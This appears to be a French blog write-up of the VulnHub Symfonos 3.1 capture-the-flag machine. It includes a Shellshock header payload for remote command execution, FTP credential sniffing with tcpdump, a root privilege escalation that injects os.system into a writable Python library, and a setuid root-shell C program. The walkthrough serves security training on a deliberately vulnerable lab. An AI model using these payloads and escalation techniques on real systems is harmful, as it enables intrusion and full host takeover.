# Solution du CTF Symfonos #3 de VulnHub

[symfonos: 3.1](https://vulnhub.com/entry/symfonos-31,332/) m'a causé quelques problèmes à l'énumération en raison d'une exentricité du serveur web. Une fois ce cas passé c'est relativement facile de trouver quoi faire mais ça requiert sans doute un peu d'expérience en CTF.

```
Nmap scan report for 192.168.56.114
Host is up (0.00011s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5b
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 cd64727680517ba8c7fdb266fab6980c (RSA)
|   256 74e59a5a4c1690cad8f7c778e75a8681 (ECDSA)
|_  256 3ce40bb9dbbf018ab79c42bccb1e416b (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
```

On retrouve la même version du FTP que sur le précédent opus mais ici impossible d'exploiter le [ProFTPd 1.3.5 - File Copy - Linux remote Exploit](https://www.exploit-db.com/exploits/36742) parce la connexion anonyme n'est pas autorisée.

## Un dédale de dossiers

Il aura fallut un paquet de minutes (d'heures) avant de faire le tour de l'énumération web.

On trouve une pléthore de dossiers vides qui sont tous sous un dossier principal `/gate`.

On trouve un fichier texte à cette adresse :

```
http://192.168.56.114/gate/cerberus/tartarus/research
```

Si on extrait les mots du texte pour s'en servir comme wordlist alors on peut trouver encore plus de dossiers :

```
301        9l       28w      324c http://192.168.56.114/gate/cerberus
301        9l       28w      333c http://192.168.56.114/gate/cerberus/tartarus
301        9l       28w      340c http://192.168.56.114/gate/cerberus/tartarus/hermes
301        9l       28w      340c http://192.168.56.114/gate/cerberus/tartarus/charon
301        9l       28w      348c http://192.168.56.114/gate/cerberus/tartarus/hecatoncheires
301        9l       28w      341c http://192.168.56.114/gate/cerberus/tartarus/acheron
301        9l       28w      341c http://192.168.56.114/gate/cerberus/tartarus/cocytus
301        9l       28w      344c http://192.168.56.114/gate/cerberus/tartarus/phlegethon
```

Mais rien ne semblait intéressant dedans.

Finalement ce qu'on cherchait était bien à la racine mais selon qu'un slash terminal soit placé ou non on obtenait soit un 404 (status ignoré par `Feroxbuster`) soit un 403.

```shellsession
$ curl -I http://192.168.56.114/cgi-bin
HTTP/1.1 404 Not Found
Date: Mon, 20 Feb 2023 21:53:33 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=iso-8859-1

$ curl -I http://192.168.56.114/cgi-bin/
HTTP/1.1 403 Forbidden
Date: Mon, 20 Feb 2023 21:53:36 GMT
Server: Apache/2.4.25 (Debian)
Content-Type: text/html; charset=iso-8859-1
```

Via une énumération rapide on trouve un cgi nommé `underworld` qui semble afficher l'uptime.

## Une faille anthique

`Wapiti` dispose d'un module pour la faille shellshock :

```shellsession
$ wapiti -u http://192.168.56.114/cgi-bin/underworld -m shellshock --scope url
ujson module not found, using json

 ██╗    ██╗ █████╗ ██████╗ ██╗████████╗██╗██████╗
 ██║    ██║██╔══██╗██╔══██╗██║╚══██╔══╝██║╚════██╗
 ██║ █╗ ██║███████║██████╔╝██║   ██║   ██║ █████╔╝
 ██║███╗██║██╔══██║██╔═══╝ ██║   ██║   ██║ ╚═══██╗
 ╚███╔███╔╝██║  ██║██║     ██║   ██║   ██║██████╔╝
  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝   ╚═╝╚═════╝  
Wapiti 3.1.6 (wapiti-scanner.github.io)
[*] Be careful! New moon tonight.
[*] Saving scan state, please wait...

[*] Launching module shellshock
URL http://192.168.56.114/cgi-bin/underworld seems vulnerable to Shellshock attack!
```

On peut regarder dans le rapport HTML généré à quoi ressemble la requête d'attaque :

```http
GET /cgi-bin/underworld HTTP/1.1
host: 192.168.56.114
connection: keep-alive
accept-language: en-US
accept-encoding: gzip, deflate, br
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
user-agent: () { :;}; echo; echo; echo -e '\x30\x37\x39\x34\x66\x38\x35\x42\x35\x63\x41\x64\x46\x44\x32\x41\x61\x41\x31\x32\x32\x33\x35\x39\x35\x34\x41\x44\x33\x44\x32\x46';
referer: () { :;}; echo; echo; echo -e '\x30\x37\x39\x34\x66\x38\x35\x42\x35\x63\x41\x64\x46\x44\x32\x41\x61\x41\x31\x32\x32\x33\x35\x39\x35\x34\x41\x44\x33\x44\x32\x46';
cookie: () { :;}; echo; echo; echo -e '\x30\x37\x39\x34\x66\x38\x35\x42\x35\x63\x41\x64\x46\x44\x32\x41\x61\x41\x31\x32\x32\x33\x35\x39\x35\x34\x41\x44\x33\x44\x32\x46';
```

On peut alors adapter pour avoir une RCE. Notez que les paths sont être complets quand on appelle une commande qui n'est pas interne à bash :

```shellsession
$ curl -D- http://192.168.56.114/cgi-bin/underworld -H "User-Agent: () { :;}; echo; echo; /usr/bin/id;"
HTTP/1.1 200 OK
Date: Mon, 20 Feb 2023 22:03:26 GMT
Server: Apache/2.4.25 (Debian)
Transfer-Encoding: chunked


uid=1001(cerberus) gid=1001(cerberus) groups=1001(cerberus),33(www-data),1003(pcap)
```

On fait partie du groupe `pcap`... Intéressant.

Une fois un shell plus agréable obtenu je remarque que l'utilisateur `hades` fait partie du groupe `gods`.

```
uid=1000(hades) gid=1000(hades) groups=1000(hades),1002(gods)
```

Forcément ça donne envie :)

## De simple humain à dieu

Revenons à notre groupe pcap. Il doit y avoir un trafic réseau à sniffer et qui dit activité réseau dit processus.

J'ai surveillé ça avec [GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy) :

```
2023/02/20 16:15:55 CMD: UID=0    PID=1      | /sbin/init 
2023/02/20 16:16:01 CMD: UID=0    PID=11107  | /usr/sbin/CRON -f 
2023/02/20 16:16:01 CMD: UID=0    PID=11106  | /usr/sbin/cron -f 
2023/02/20 16:16:01 CMD: UID=0    PID=11111  | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt 
2023/02/20 16:16:01 CMD: UID=0    PID=11110  | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
2023/02/20 16:16:01 CMD: UID=0    PID=11109  | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
2023/02/20 16:16:01 CMD: UID=0    PID=11108  | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt 
2023/02/20 16:16:02 CMD: UID=0    PID=11112  | proftpd: (accepting connections)               
2023/02/20 16:16:02 CMD: UID=0    PID=11113  | /usr/sbin/CRON -f 
2023/02/20 16:16:02 CMD: UID=105  PID=11114  | /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root 
2023/02/20 16:16:02 CMD: UID=0    PID=11115  | /usr/sbin/exim4 -Mc 1pUES2-0002tF-31
```

Je lance la surveillance du port FTP :

```shellsession
cerberus@symfonos3:/tmp$ tcpdump -i any -x "tcp port 21"
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on any, link-type LINUX_SLL (Linux cooked), capture size 262144 bytes
--- snip ---
16:24:01.942666 IP localhost.49848 > localhost.ftp: Flags [P.], seq 1:13, ack 56, win 342, options [nop,nop,TS val 1376255 ecr 1376253], length 12: FTP: USER hades
        0x0000:  4500 0040 742a 4000 4006 c88b 7f00 0001
        0x0010:  7f00 0001 c2b8 0015 06cf 8bdf e1a9 68cc
        0x0020:  8018 0156 fe34 0000 0101 080a 0014 ffff
        0x0030:  0014 fffd 5553 4552 2068 6164 6573 0d0a
16:24:01.942673 IP localhost.ftp > localhost.49848: Flags [.], ack 13, win 342, options [nop,nop,TS val 1376255 ecr 1376255], length 0
        0x0000:  4500 0034 976d 4000 4006 a554 7f00 0001
        0x0010:  7f00 0001 0015 c2b8 e1a9 68cc 06cf 8beb
        0x0020:  8010 0156 fe28 0000 0101 080a 0014 ffff
        0x0030:  0014 ffff
16:24:01.945057 IP localhost.ftp > localhost.49848: Flags [P.], seq 56:89, ack 13, win 342, options [nop,nop,TS val 1376255 ecr 1376255], length 33: FTP: 331 Password required for hades
        0x0000:  4500 0055 976e 4000 4006 a532 7f00 0001
        0x0010:  7f00 0001 0015 c2b8 e1a9 68cc 06cf 8beb
        0x0020:  8018 0156 fe49 0000 0101 080a 0014 ffff
        0x0030:  0014 ffff 3333 3120 5061 7373 776f 7264
        0x0040:  2072 6571 7569 7265 6420 666f 7220 6861
        0x0050:  6465 730d 0a
16:24:01.945493 IP localhost.49848 > localhost.ftp: Flags [P.], seq 13:36, ack 89, win 342, options [nop,nop,TS val 1376256 ecr 1376255], length 23: FTP: PASS PTpZTfU4vxgzvRBE
 
```

Les identifiants permettent de se connecter en tant que `hades`.

## De simple dieu à root

Sans trop de surprise (au vu de la commande cron exécutée par `root`), on a le contrôle sur des fichiers en rapport avec Python :

```shellsession
hades@symfonos3:~$ find / -type d -group gods -writable 2> /dev/null 
/usr/lib/python2.7
```

Le script appelé en tâche planifiée utilise le module standard `ftplib` :

```python
import ftplib

ftp = ftplib.FTP('127.0.0.1')
ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

ftp.cwd('/srv/ftp/')

def upload():
    filename = '/opt/client/statuscheck.txt'
    ftp.storbinary('STOR '+filename, open(filename, 'rb'))
    ftp.quit()

upload()
```

Il suffit de modifier `/usr/lib/python2.7/ftplib.py` pour rajouter la commande que l'on souhaite :

```python
os.system("chown root:root /home/hades/gotroot; chmod 4755 /home/hades/gotroot;")
```

Pour moi le programme correspond à ce code C compilé :

```c
#include <unistd.h>
#include <stdlib.h>

int main(void) {
        setreuid(0, 0);
        setregid(0, 0);
        system("/bin/bash -p");
        return 0;
}
```

On attend un peu et ça marche :

```shellsession
hades@symfonos3:~$ ls -l gotroot 
-rwsr-xr-x 1 root root 3299936 Feb 20 16:43 gotroot
hades@symfonos3:~$ ./gotroot 
root@symfonos3:~# id
uid=0(root) gid=0(root) groups=0(root),1000(hades),1002(gods)
root@symfonos3:~# cd /root
root@symfonos3:/root# ls
proof.txt
root@symfonos3:/root# cat proof.txt 

        Congrats on rooting symfonos:3!
                                        _._
                                      _/,__\,
                                   __/ _/o'o
                                 /  '-.___'/  __
                                /__   /\  )__/_))\
     /_/,   __,____             // '-.____|--'  \\
    e,e / //  /___/|           |/     \/\        \\
    'o /))) : \___\|          /   ,    \/         \\
     -'  \\__,_/|             \/ /      \          \\
             \_\|              \/        \          \\
             | ||              <    '_    \          \\
             | ||             /    ,| /   /           \\
             | ||             |   / |    /\            \\
             | ||              \_/  |   | |             \\
             | ||_______________,'  |__/  \              \\
              \|/_______________\___/______\_             \\
               \________________________     \__           \\        ___
                  \________________________    _\_____      \\ _____/
                     \________________________               \\
        ~~~~~~~        /  ~~~~~~~~~~~~~~~~~~~~~~~~~~~  ~~ ~~~~\\~~~~
            ~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~    //

        Contact me via Twitter @zayotic to give feedback!
```

*Publié le 20 février 2023*
